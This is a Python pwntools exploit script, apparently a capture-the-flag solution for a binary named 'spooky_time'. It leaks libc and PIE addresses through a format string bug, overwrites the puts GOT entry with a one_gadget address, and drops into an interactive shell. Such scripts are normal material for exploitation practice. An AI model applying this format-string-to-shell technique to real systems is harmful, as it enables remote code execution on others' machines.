from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1492
continue
'''.format(**locals())

exe = './spooky_time'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
#pause()

sh.sendline('%3$p.%51$p')
sh.recvuntil(b'than')
sh.recvline()
get = sh.recvlineS()
print('GRABBED:',get)

potential_libc_leak = get[:14]
#print(potential_libc_leak)
libc_leak = int(potential_libc_leak, 16)
log.info('LIBC_LEAK --> %#0x', libc_leak)
pie_base_leak = get[15:]
pie_leak = int(pie_base_leak, 16)
log.info('PIE_LEAK --> %#0x', pie_leak)
#print(pie_base_leak)

elf.address = pie_leak - 0x13c0 #5056 
log.info('Calculated base address --> %#0x', elf.address)

libc.address = libc_leak - 0x114a37 #1133111
log.info('Calculated lib_base --> %#0x', libc.address)

offset = 8
one_gadget = libc.address + 0xebcf5 # 3rd one_gadget
payload = fmtstr_payload(offset, {elf.got['puts'] : one_gadget}) # overwrite puts@got
sh.sendlineafter(b'time..\n\n', payload)

sh.interactive()
